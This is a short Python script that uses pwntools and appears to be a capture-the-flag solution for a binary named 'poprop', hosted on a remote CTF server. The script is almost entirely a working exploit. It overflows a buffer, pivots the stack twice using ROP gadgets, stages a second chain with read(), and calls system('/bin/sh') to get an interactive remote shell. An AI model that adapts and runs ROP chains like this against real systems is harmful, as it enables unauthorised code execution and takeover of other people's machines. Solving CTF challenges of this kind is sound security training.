from pwn import *

#exe = ELF('poprop')


pop_rsp_rbp = 0x0000000000401200
pop_rdi_rbp = 0x00000000004011f7
pop_rsi_rbp = 0x00000000004011fa
pop_rdx_rbp = 0x00000000004011f4
read = 0x4010a4
system = 0x00401277
message = 0x4040a0

payload = b'A'*0x14 #dummy
payload+=p64(pop_rsp_rbp)+p64(message) # first stack pivoting

#io = process(exe.path)

io = remote('pwn-2.mephictf.ru' ,7769)

io.send(payload)

sleep(1)

io.send(str(0).encode())

sleep(1)

pivoting1 = b'/bin/sh\x00' #/bin/sh string
pivoting1+=p64(pop_rdi_rbp)+p64(0)+p64(message) #set rdi to 0
pivoting1+=p64(pop_rsi_rbp)+p64(message+0x908)+p64(message) #set rsi to message+0x908
pivoting1+=p64(pop_rdx_rbp)+p64(0x200)+p64(message) #set rdx to 0x200
pivoting1+=p64(read)  # read(0,message+0x908,0x200);
pivoting1+=p64(pop_rsp_rbp)+p64(message+0x908) # second stack pivoting to message+0x908
io.send(pivoting1)
#pause()
pivoting2=p64(message) #set rbp to message
pivoting2+=p64(pop_rdi_rbp)+p64(message) #set rdi to message(address of /bin/sh)
pivoting2+=p64(message) #set rbp to message
pivoting2+=p64(system) #call system

sleep(1)

io.send(pivoting2)

io.interactive()

